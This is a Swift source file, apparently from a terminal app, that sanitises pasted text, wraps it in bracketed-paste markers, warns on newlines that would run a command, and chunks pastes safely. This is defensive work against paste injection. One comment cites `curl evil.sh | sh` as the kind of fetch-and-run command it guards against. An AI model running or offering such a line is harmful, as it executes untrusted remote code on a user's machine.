// Copyright 2026 Noah Qin
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

import Foundation

/// Sanitises and wraps pasted text for the child (`SECURITY.md` §2.3: "a
/// paste is data, never a command stream"): strip ESC and other C0, and
/// warn on a newline without bracketed paste, where it would run the line
/// (`curl evil.sh | sh`). `nonisolated` so it is testable.
nonisolated enum Paste {
    /// The ?2004 markers.
    static let bracketStart: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x30, 0x7E]
    static let bracketEnd: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x31, 0x7E]

    /// Strips C0 except tab, LF and CR (newlines are guarded by the warning),
    /// DEL and C1. DEL is a line editor's backspace, so a pasted one erased
    /// text the user had seen and left a different command than the one on
    /// the clipboard; C1 includes CSI and ST, which a program reading 8-bit
    /// controls takes for the end of a bracketed paste.
    static func sanitized(_ text: String) -> String {
        String(String.UnicodeScalarView(text.unicodeScalars.filter { scalar in
            switch scalar.value {
            case 0x09, 0x0A, 0x0D: return true
            case 0x00..<0x20, 0x7F...0x9F: return false
            default: return true
            }
        }))
    }

    /// A newline (LF or CR) without bracketed paste would execute.
    static func needsWarning(text: String, bracketedPasteEnabled: Bool) -> Bool {
        // CRLF is one Swift Character; matching individual Characters misses
        // it. The child receives bytes, so inspect the scalar representation.
        !bracketedPasteEnabled && text.unicodeScalars.contains { $0.value == 10 || $0.value == 13 }
    }

    /// What ends a paste for the child: the closing marker when bracketed.
    /// A cancelled paste the child started reading is closed with it, or the
    /// shell stays in paste mode (`TerminalSession.write(paste:closing:)`).
    static func closing(bracketedPasteEnabled: Bool) -> [UInt8]? {
        bracketedPasteEnabled ? bracketEnd : nil
    }

    /// Ctrl-C as the pane sends it — the kitty protocol's `disambiguate`
    /// leaves it legacy — and the keystroke that cancels a paste still
    /// queued ahead of it.
    static func isInterrupt(_ bytes: [UInt8]) -> Bool {
        bytes == [0x03]
    }

    /// A paste as the session queues it: the text in chunks that never cut a
    /// UTF-8 character, the opening marker on the first, and the closing
    /// marker — with `trailer`, a Return — as a chunk of its own. A cancel
    /// between chunks then never splits a character or a marker.
    static func chunks(
        for text: String, bracketedPasteEnabled: Bool, trailer: [UInt8] = [],
        maxChunkSize: Int = defaultChunkSize
    ) -> [[UInt8]] {
        var chunks = chunked(Array(text.utf8), maxChunkSize: maxChunkSize)
        if bracketedPasteEnabled {
            if chunks.isEmpty { chunks = [bracketStart] } else { chunks[0] = bracketStart + chunks[0] }
            chunks.append(bracketEnd + trailer)
        } else if !trailer.isEmpty {
            chunks.append(trailer)
        }
        return chunks
    }

    /// Wrapped in the ?2004 markers when bracketed, so it reads as data.
    static func bytes(for text: String, bracketedPasteEnabled: Bool) -> [UInt8] {
        let payload = Array(text.utf8)
        guard bracketedPasteEnabled else { return payload }
        return bracketStart + payload + bracketEnd
    }

    /// Output-derived history is inserted as data; only explicit Run adds
    /// Return. Without bracketed paste, multiline insertion cannot be safe.
    static func historyBytes(for text: String, bracketedPasteEnabled: Bool) -> [UInt8]? {
        let text = sanitized(text)
        guard !text.isEmpty,
            !needsWarning(text: text, bracketedPasteEnabled: bracketedPasteEnabled)
        else { return nil }
        return bytes(for: text, bracketedPasteEnabled: bracketedPasteEnabled)
    }

    /// Write-call size for a wrapped paste; the child sees one stream. Chunks
    /// share `TerminalSession`'s FIFO with keystrokes, so typing mid-paste
    /// waits one chunk. Matches `TerminalSession.readChunkSize`.
    static let defaultChunkSize = 64 * 1024

    /// In-order chunks; empty in, none out; a non-positive size yields one.
    /// A cut lands before a UTF-8 lead byte, never inside a character, unless
    /// a whole chunk is continuation bytes (not UTF-8 anyway).
    static func chunked(_ bytes: [UInt8], maxChunkSize: Int = defaultChunkSize) -> [[UInt8]] {
        guard !bytes.isEmpty else { return [] }
        guard maxChunkSize > 0 else { return [bytes] }
        var chunks: [[UInt8]] = []
        chunks.reserveCapacity((bytes.count + maxChunkSize - 1) / maxChunkSize)
        var offset = 0
        while offset < bytes.count {
            var end = min(offset + maxChunkSize, bytes.count)
            var boundary = end
            while boundary > offset, boundary < bytes.count, bytes[boundary] & 0xC0 == 0x80 {
                boundary -= 1
            }
            if boundary > offset { end = boundary }
            chunks.append(Array(bytes[offset..<end]))
            offset = end
        }
        return chunks
    }
}
